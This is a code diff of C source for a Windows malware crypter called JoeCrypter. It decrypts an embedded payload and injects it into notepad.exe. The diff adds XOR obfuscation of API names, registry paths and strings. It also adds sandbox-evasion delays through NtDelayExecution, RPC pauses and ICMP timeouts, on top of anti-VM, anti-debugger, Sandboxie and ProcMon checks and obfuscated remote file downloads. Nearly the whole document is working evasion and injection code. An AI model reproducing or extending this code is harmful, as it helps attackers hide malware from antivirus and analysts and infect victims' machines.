@@ -1,9 +1,15 @@
+#include <winsock2.h>
+#include <iphlpapi.h>
+#include <icmpapi.h>
 #include <windows.h>
 #include <stdio.h>
 #include <wbemidl.h>
 #include <time.h>
 #include <Objbase.h>
+#include <rpcdcep.h>
 #include "joecrypt_injecter.h"
+#pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "ws2_32.lib")
 #define WIN32_LEAN_AND_MEAN
 #define MAX_KEY_LENGTH 255
 #define MAX_VALUE_NAME 16383
@@ -11,7 +17,8 @@
 
 // function prototypes
 byte *GetPayload(void);
-byte *decrypted(byte *data, int length, int decrkey);
+byte *decrypted(byte *data, int length, int crytptkey);
+WCHAR *widedecrypt(byte *data, int length, int crytptkey);
 void LongStall(void);
 int procmem_evas(void);
 int NumaEvas(void);
@@ -19,7 +26,12 @@ int AllocMem_Fornoreason(void);
 void MemSizeTrick(void);
 int LotsOfWindows(HWND);
 int FlsTrick(void);
+int timing_evasion_1(void);
+int timing_evasion_2(void);
 int timing_evasion_3(void);
+int timing_evasion_4(void);
+int timing_evasion_5(void);
+int timing_evasion_6(void);
 void PassToNoobs(void);
 char GetBeingDebugged(void);
 BOOL IsInsideVMWare(void);
@@ -37,6 +49,7 @@ void AntiProcMon(void);
 void date_specific_check(char *shortdate);
 void region_specific_check(char *region);
 
+
 //const char g_szClassName[] = "JoeCrypter";
 
 
@@ -49,10 +62,9 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     {
 		case WM_CREATE:
 		{	
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   int crytptkey = 95084;
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
-			byte *payload = decrypted(GetPayload(),rsrc_len, crytptkey);
-			ExecFile("c:\\windows\\system32\\notepad.exe",payload);
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+			byte *payload = decrypted(GetPayload(),rsrc_len, 123);
+			ExecFile(decrypted("f?YYrlkajrvYYv|vq`h67YYkjq`uda+`}`",34,5),payload); // xor'd by 5 from c:\\windows\\system32\\notepad.exe
 		}
 		break;
         case WM_CLOSE:
@@ -117,12 +129,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     {
         return 0;
     }
+
     hwnd = CreateWindowEx(
         WS_EX_CLIENTEDGE,
         mystr,
         name2,
         WS_OVERLAPPEDWINDOW,
-        CW_USEDEFAULT, CW_USEDEFAULT, 240, 120,
+        CW_USEDEFAULT, CW_USEDEFAULT, kk, kk, //changed 240, 120 to use the random val
         NULL, NULL, hInstance, NULL);
 
 
@@ -171,12 +184,12 @@ byte *GetPayload(void)
 
 void LongStall(void)
 {
-	DWORD somestupidvar=timeGetTime() * 20;
+	DWORD ayylmao=timeGetTime() * 21;
 	_asm
 	{
 	xor eax,eax
 	xor ecx,ecx
-	mov eax,somestupidvar
+	mov eax,ayylmao
 	mov ecx,0
 	testd:
 	fnop
@@ -207,41 +220,11 @@ typedef BOOL (*_GetProcessMemoryInfo)(HANDLE proc, PPROCESS_MEMORY_COUNTERS pmc,
 
 int procmem_evas(void)
 {
-	  char psapi[10];
-		psapi[0] = 'p';
-		psapi[1] = 's';
-		psapi[2] = 'a';
-		psapi[3] = 'p';
-		psapi[4] = 'i';
-		psapi[5] = '.';
-		psapi[6] = 'd';
-		psapi[7] = 'l';
-		psapi[8] = 'l';
-		psapi[9] = '\0';
-	char gpmi[21];
-		gpmi[0] = 'G';
-		gpmi[1] = 'e';
-		gpmi[2] = 't';
-		gpmi[3] = 'P';
-		gpmi[4] = 'r';
-		gpmi[5] = 'o';
-		gpmi[6] = 'c';
-		gpmi[7] = 'e';
-		gpmi[8] = 's';
-		gpmi[9] = 's';
-		gpmi[10] = 'M';
-		gpmi[11] = 'e';
-		gpmi[12] = 'm';
-		gpmi[13] = 'o';	
-		gpmi[14] = 'r';
-		gpmi[15] = 'y';
-		gpmi[16] = 'I';
-		gpmi[17] = 'n';
-		gpmi[18] = 'f';
-		gpmi[19] = 'o';
-		gpmi[20] = '\0';
-PROCESS_MEMORY_COUNTERS pmc;
-GetProcMem = (_GetProcessMemoryInfo)GetProcAddress(LoadLibrary(psapi),gpmi);
+	  char *dll = "wtfwn)ckk"; // psapi.dll
+	char *funcname = "DfwSql`fppNfnlqzJmel"; // GetProcessMemoryInfo
+	PROCESS_MEMORY_COUNTERS pmc;
+GetProcMem = (_GetProcessMemoryInfo)GetProcAddress(LoadLibrary(decrypted(dll,9,7)),decrypted(funcname,20,3));
+
 
 GetProcMem(GetCurrentProcess(), &pmc, sizeof(pmc));
   if(pmc.WorkingSetSize<=3456789)
@@ -267,11 +250,14 @@ int NumaEvas(void) // doesnt work on xp
 {
 	OSVERSIONINFO osvi;
 	GetVersionEx(&osvi);
+	char *libname = "jdsodm23/emm"; // kernel32.dll,12,1
+	char *funcname = "TkpvwcnCnnmaGzLwoc"; // VirtualAllocExNuma,18,2
 	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
 	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
 	 if(osvi.dwMajorVersion >= 6)
 	 {
-	 Numa = (_VirtualAllocExNuma)GetProcAddress(LoadLibrary("kernel32.dll"),"VirtualAllocExNuma");
+	 Numa = (_VirtualAllocExNuma)GetProcAddress(LoadLibrary(decrypted(libname,12,1)),decrypted(funcname,18,2));
+	 
 	 LPVOID mem = NULL;
 	 mem = Numa(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE,0);
 	 if(mem != NULL)
@@ -303,7 +289,7 @@ int AllocMem_Fornoreason(void)
 	{
 	// allocate like 350 megs of ram, then free, rinse repeat a couple times.
 	LPVOID kek = VirtualAlloc(NULL,367001600, MEM_RESERVE | MEM_COMMIT,0x40);
-	Sleep(5000); // Sleep 5 seconds and free
+	Sleep(5012); // Sleep 5 seconds and free
 	VirtualFree(kek,367001600,MEM_RELEASE|MEM_DECOMMIT);
 	}
 	return 0;
@@ -314,10 +300,13 @@ int AllocMem_Fornoreason(void)
     _CreateWindowExA CreateDaWindow;
 int LotsOfWindows(HWND mainwindow) 
 { 
+	char *libname = "~xny89%ogg"; // user32.dll,10,11
+	char *funcname = "J{lh}l^`gmf~LqH"; // CreateWindowExA,15,9
 	HWND hoep;
-	CreateDaWindow = (_CreateWindowExA)GetProcAddress(LoadLibrary("user32.dll"),"CreateWindowExA");
+	CreateDaWindow = (_CreateWindowExA)GetProcAddress(LoadLibrary(decrypted(libname,10,11)),decrypted(funcname,15,9));
+	
 	int x;
-	for(x=0;x<12345;x++)
+	for(x=0;x<12321;x++)
 	{
 		if(x % 2 == 0) // even
 		{
@@ -332,7 +321,7 @@ int LotsOfWindows(HWND mainwindow)
     		wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
     		wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
     		wc.lpszMenuName  = NULL;
-    		wc.lpszClassName = "lol";
+    		wc.lpszClassName = "Explorer";
     		wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);
 			RegisterClassEx(&wc);
 			
@@ -376,7 +365,10 @@ int LotsOfWindows(HWND mainwindow)
 typedef DWORD (*_FlsAlloc) (PFLS_CALLBACK_FUNCTION lpCallback); _FlsAlloc FlsCrap;
 int FlsTrick(void)
 {
-	FlsCrap = (_FlsAlloc)GetProcAddress(LoadLibrary("Kernel32.dll"),"FlsAlloc");
+	char *libname = "Mcthcj54(bjj"; // Kernel32.dll,12,6
+	char *funcname = "EopBool`"; // FlsAlloc,8,3
+	FlsCrap = (_FlsAlloc)GetProcAddress(LoadLibrary( decrypted(libname,12,6)) ,decrypted(funcname,8,3));
+	
 	OSVERSIONINFO osvi;
 	ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
 	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
@@ -403,26 +395,6 @@ int FlsTrick(void)
 		return 1;
 	}
 }
-int timing_evasion_3(void)
-{	
-	DWORD joe_time_test1, joe_time_test2;
-	joe_time_test1 = timeGetTime();
-	Sleep(1000);
-	joe_time_test2 = timeGetTime();
-	if((joe_time_test2 > (joe_time_test1+ 1000))&&(joe_time_test2 < (joe_time_test1+ 1005)))
-	{
-		return 0;
-	}
-	else
-	{
-		__asm
-		{
-			push 0
-			call ExitProcess
-		}
-		return 0;
-	}
-}
 
 void PassToNoobs(void)
 {
@@ -430,7 +402,7 @@ void PassToNoobs(void)
 	{
 		_emit 0xCD
 		_emit 0x01
-		mov eax,0x80087355
+		rdtsc
 		jmp eax
 	}
 }
@@ -527,7 +499,10 @@ typedef NTSTATUS ( WINAPI *NQIP )( HANDLE, LONG, PVOID, ULONG, PULONG );
 	
 void checkQIP(void)
 {
-	NQIP NtQueryInformationProcess = ( NQIP )GetProcAddress( GetModuleHandle( "ntdll.dll" ), "NtQueryInformationProcess" );
+	char *libname = "mwgoo-goo"; // ntdll.dll,9,3
+	char *funcname = "JpUqav}MjbkviepmkjTvkgaww"; // NtQueryInformationProcess,25,4
+	
+	NQIP NtQueryInformationProcess = ( NQIP )GetProcAddress( GetModuleHandle( decrypted(libname,9,3) ), decrypted(funcname,25,4) );
 	int returnValue = 0;
 	NtQueryInformationProcess( GetCurrentProcess( ), 0x7, &returnValue, 4, 0 );
 	if( returnValue != 0 )
@@ -551,7 +526,8 @@ void anti_vm_wmi(void)
 
     BSTR resource = SysAllocString(L"ROOT\\CIMV2");
     BSTR language = SysAllocString(L"WQL");
-    BSTR query    = SysAllocString(L"SELECT * FROM Win32_DiskDrive");
+        //BSTR query    = SysAllocString(L"SELECT * FROM Win32_DiskDrive");
+	BSTR query    = SysAllocString(widedecrypt("WAHAGP$.$BVKI$Smj76[@mwo@vmra",29,4));
 	// SELECT Caption FROM Win32_DiskDrive
 
     hr = CoInitializeEx(0, COINIT_MULTITHREADED);
@@ -564,13 +540,13 @@ void anti_vm_wmi(void)
         ULONG returnedCount = 0;
         while((hr = results->lpVtbl->Next(results, WBEM_INFINITE, 1, &result, &returnedCount)) == S_OK) {
             VARIANT caption;
-            hr = result->lpVtbl->Get(result, L"Caption", 0, &caption, 0, 0);
+            hr = result->lpVtbl->Get(result, widedecrypt("Fduqljk",7,5), 0, &caption, 0, 0); // Caption
 			char prop[128];
 			wcstombs(prop,caption.bstrVal,SysStringByteLen(caption.bstrVal));
 			
-			char *vm1 = "QEMU";
-			char *vm2 = "VMware";
-			char *vm3 = "vbox";
+			char *vm1 = decrypted("UAIQ",4,4); // QEMU
+			char *vm2 = decrypted("_D~h{l",6,9); // VMware
+			char *vm3 = decrypted("pdi~",4,6); // vbox
 
 			if(strstr(prop,vm1))
 			{
@@ -612,8 +588,9 @@ int reg_enum_vm_check(void)
 // with IDE on virtualbox
 // (1) CdRomNECVMWar_VMware_IDE_CDR10_______________1.00____
 // (2) DiskVMware_Virtual_IDE_Hard_Drive___________00000001
-
-   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Enum\\IDE\\"), 0,
+	// SYSTEM\\CurrentControlSet\\Enum\\IDE\\
+	
+   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, decrypted("V\VQ@HYYFpww`kqFjkqwjiV`qYY@kphYYLA@YY",38,5), 0,
 	 KEY_READ, &hTestKey) == ERROR_SUCCESS)
    	{
 	TCHAR    achKey[MAX_KEY_LENGTH];
@@ -639,15 +616,15 @@ int reg_enum_vm_check(void)
             retCode = RegEnumKeyEx(hTestKey, i, achKey, &cbName, NULL, NULL, NULL, &ftLastWriteTime); 
             if (retCode == ERROR_SUCCESS) 
             {
-                if(strstr(achKey,"VMware"))
+                if(strstr(achKey,decrypted("^Eizm",6,8))) // VMware
 				{
 				PassToNoobs();
 				}
-				if(strstr(achKey,"QEMU"))
+				if(strstr(achKey,decrypted("T@HP",4,5))) // QEMU
 				{
 				PassToNoobs();
 				}
-				if(strstr(achKey,"vbox"))
+				if(strstr(achKey,decrypted("|her",4,10))) // vbox
 				{
 				
 				PassToNoobs();
@@ -661,8 +638,8 @@ int reg_enum_vm_check(void)
    
    RegCloseKey(hTestKey);
    
-   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SYSTEM\\CurrentControlSet\\Enum\\SCSI\\"), 0,
-	 KEY_READ, &hTestKey) == ERROR_SUCCESS)
+   if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, decrypted("RXRUDL]]BtssdouBnousnmRdu]]Dotl]]RBRH]]",39,1), 0,
+	 KEY_READ, &hTestKey) == ERROR_SUCCESS) // TEXT("SYSTEM\\CurrentControlSet\\Enum\\SCSI\\")
    	{
 	TCHAR    achKey[MAX_KEY_LENGTH];
     DWORD    cbName;
@@ -687,15 +664,15 @@ int reg_enum_vm_check(void)
             retCode = RegEnumKeyEx(hTestKey, i, achKey, &cbName, NULL, NULL, NULL, &ftLastWriteTime); 
             if (retCode == ERROR_SUCCESS) 
             {
-                if(strstr(achKey,"VMware"))
+                if(strstr(achKey,decrypted("^Eizm",6,8))) // VMware
 				{
 				PassToNoobs();
 				}
-				if(strstr(achKey,"QEMU"))
+				if(strstr(achKey,decrypted("T@HP",4,5))) // QEMU
 				{
 				PassToNoobs();
 				}
-				if(strstr(achKey,"vbox"))
+				if(strstr(achKey,decrypted("|her",4,10))) // vbox
 				{
 				
 				PassToNoobs();
@@ -715,7 +692,7 @@ int reg_enum_vm_check(void)
 
 int AntiEmu(void)
 {
-	if(GetModuleHandle("SbieDll.dll") !=0)
+	if(GetModuleHandle(decrypted("RchdEmm/emm",11,1)) !=0) // SbieDll.dll
 	{
 	PassToNoobs();
 	}
@@ -742,16 +719,23 @@ void special_usercheck(void)
 
 void JoeSpecial(void)
 {
+    char *libname = "vqonlm-goo"; // urlmon.dll,10,3
+	char *funcname = "RUKChpikhfcShAnkbF"; // URLDownloadToFileA,18,7
+	char *powerrangersbg = "jvvr8--koe27,fgtkclvcpv,lgv-350:-k-0232-070-`-0-qc`cl]rmugp]pclegpq]ucnnrcrgp]`{]qamvvcqn/f0{axsx,hre"; 
+	// http://img05.deviantart.net/1728/i/2010/252/b/2/saban_power_rangers_wallpaper_by_scottasl-d2yczqz.jpg , 101,2
+	char *bmp_bg = "a}}y3&&jfg}{`k$}lz}$`y'hgm{l~'jd|'lm|&y|k&zjlgl'f{n&n{hya`jz&h{}`z}z&{hz}hdfg&apf'kdy"; 
+	// http://contrib-test-vip.andrew.cmu.edu/pub/scene.org/graphics/artists/rastamon/hyo.bmp , 86, 9 
+	
 typedef HRESULT (*_URLDownloadToFile) (LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, 
 DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB); _URLDownloadToFile GrabFile;
-GrabFile = (_URLDownloadToFile)GetProcAddress(LoadLibrary("urlmon.dll"),"URLDownloadToFileA");
+GrabFile = (_URLDownloadToFile)GetProcAddress(LoadLibrary(decrypted(libname,10,3)),decrypted(funcname,18,7));
 OSVERSIONINFO osvi;
 ZeroMemory(&osvi, sizeof(OSVERSIONINFO));
 osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
 GetVersionEx(&osvi);
     if(osvi.dwMajorVersion >= 6)
     {
-			if (GrabFile(NULL, "http://img05.deviantart.net/1728/i/2010/252/b/2/saban_power_rangers_wallpaper_by_scottasl-d2yczqz.jpg", 
+			if (GrabFile(NULL, decrypted(powerrangersbg,101,2), 
 			"c:\\bg.jpg", 0, NULL) == S_OK)
 			{
 			Sleep(500);
@@ -760,7 +744,7 @@ GetVersionEx(&osvi);
 	}
 	else
 	{
-			if (GrabFile(NULL, "http://contrib-test-vip.andrew.cmu.edu/pub/scene.org/graphics/artists/rastamon/hyo.bmp", 
+			if (GrabFile(NULL, decrypted(bmp_bg,86,9), 
 			"c:\\lol.bmp", 0, NULL) == S_OK)
 			{
 			Sleep(500);
@@ -853,7 +837,9 @@ return;
 
 void AntiProcMon(void) // EXPIMENTAL. Detects if procmon has ever been run
 {
-	CreateFile("\\\\.\\ProcmonDebugLogger", GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0); 
+	
+	// \\\\.\\ProcmonDebugLogger, 25, 9
+	CreateFile(decrypted("UUUU'UUY{fjdfgMlk|nEfnnl{",25,9), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0); 
 	if(GetLastError() == 2)
 	{
 		return;
@@ -1057,7 +1043,154 @@ byte *decrypted(byte *data, int length, int crytptkey)
 	byte *out = (byte*)malloc(length+1);
 	for(int x=0;x < length;x++)
 	{
-	out[x] = data[x] ^ crytptkey ; 
+	out[x] = data[x] ^ crytptkey; 
 	}
 	return out;
 }
+
+WCHAR *widedecrypt(byte *data, int length, int crytptkey)
+{	
+	WCHAR *out = (WCHAR*)malloc(length+1);
+	for(int x=0;x < length;x++)
+	{
+	out[x] = data[x] ^ crytptkey; 
+	}
+	return out;
+}
+
+int timing_evasion_1(void)
+{	
+	DWORD joe_time_test1, joe_time_test2;
+	joe_time_test1 = timeGetTime();
+	Sleep(1000);
+	joe_time_test2 = timeGetTime();
+	if((joe_time_test2 > (joe_time_test1+ 1000))&&(joe_time_test2 < (joe_time_test1+ 1005)))
+	{
+		return 0;
+	}
+	else
+	{
+		__asm
+		{
+			push 0
+			call ExitProcess
+		}
+		return 0;
+	}
+}
+
+int timing_evasion_2(void)
+{	
+I_RpcPauseExecution(600000); // ten mins
+int x = 0;
+__asm{
+mov x,edx
+}
+return x;
+}
+
+int timing_evasion_3(void)
+{	
+	char *libname  = "lvfnn,fnn"; // ntdll.dll,9,2
+	char *funcname = "Jp@ahe}A|agqpmkj"; // NtDelayExecution,16,4
+    HMODULE hDLL_ = LoadLibrary(decrypted(libname,9,2));
+	if(hDLL_)
+	{
+	__int64 y = -6000000000; // 600 seconds or 10 mins
+	FARPROC mydelay = GetProcAddress(hDLL_,decrypted(funcname,16,4));
+	mydelay(FALSE,&y);
+	}
+int x = 0;
+__asm{
+mov x,ecx
+}
+return x;
+}
+
+
+
+int timing_evasion_4(void)
+{	
+	HANDLE hIcmpFile;
+    unsigned long destip = inet_addr("224.0.0.0");
+	char SendData[9]; // random data
+	DWORD kek = GetTickCount();
+	sprintf(SendData,"%x",kek);
+    LPVOID ReplyBuffer = NULL;
+    DWORD ReplySize = 0;
+    hIcmpFile = IcmpCreateFile();
+    ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
+    ReplyBuffer = (VOID*) malloc(ReplySize);
+    IcmpSendEcho(hIcmpFile, destip, SendData, sizeof(SendData), NULL, ReplyBuffer, ReplySize, 600000);
+	int x = 0;
+	__asm{
+	mov x,ebx
+		}
+	return x;
+}
+int timing_evasion_5(void)
+{	
+	HANDLE hIcmpFile;
+    unsigned long destip = inet_addr("224.0.0.0");
+	char SendData[9]; // random data
+	DWORD kek = GetTickCount();
+	sprintf(SendData,"%x",kek);
+    LPVOID ReplyBuffer = NULL;
+    DWORD ReplySize = 0;
+    hIcmpFile = IcmpCreateFile();
+    ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
+    ReplyBuffer = (VOID*) malloc(ReplySize);
+    IcmpSendEcho2(hIcmpFile, NULL, NULL, NULL, destip, SendData, sizeof(SendData), NULL, ReplyBuffer, ReplySize, 600000);
+	int x = 0;
+	__asm{
+	mov x,eax
+		}
+	return x;
+}
+int timing_evasion_6(void)
+{	
+	WSADATA wsa_Data;
+	WSAStartup(0x101,&wsa_Data);
+	char szHostName[255];
+	gethostname(szHostName, 255);
+	struct hostent *host_entry;
+	host_entry=gethostbyname(szHostName);
+	char *szLocalIP;
+	szLocalIP = inet_ntoa (*(struct in_addr *)*host_entry->h_addr_list);
+	WSACleanup();	    
+    HANDLE hIcmpFile;
+    unsigned long destip = inet_addr("224.0.0.0");
+	unsigned long sourceip = inet_addr(szLocalIP); // needs IP of machine for this to work.
+	char SendData[9]; // random data
+	DWORD kek = GetTickCount();
+	sprintf(SendData,"%x",kek);
+    LPVOID ReplyBuffer = NULL;
+    DWORD ReplySize = 0;
+    hIcmpFile = IcmpCreateFile();
+    ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
+    ReplyBuffer = (VOID*) malloc(ReplySize);
+   	IcmpSendEcho2Ex(hIcmpFile,NULL,NULL,NULL,sourceip,destip,SendData,sizeof(SendData),NULL,ReplyBuffer,ReplySize,600000); // 10 mins
+	int x = 0;
+	__asm{
+	mov x,ebx
+		}
+	return x;
+}
+
+/* possibly use this for verifying sleep took place. Maybe add later.
+	LASTINPUTINFO lel;
+	lel.cbSize = sizeof(LASTINPUTINFO);
+	GetLastInputInfo(&lel);
+	int timeout = 7000;
+	Sleep(timeout); // sleep method
+	DWORD lk = GetTickCount();
+	if((lk - lel.dwTime) < timeout + 1000) // 1 min
+	{
+		// looks like sleep worked.
+	}
+	else
+	{
+		// sleep function likely hooked / nulled out, fail!
+	}
+
+*/
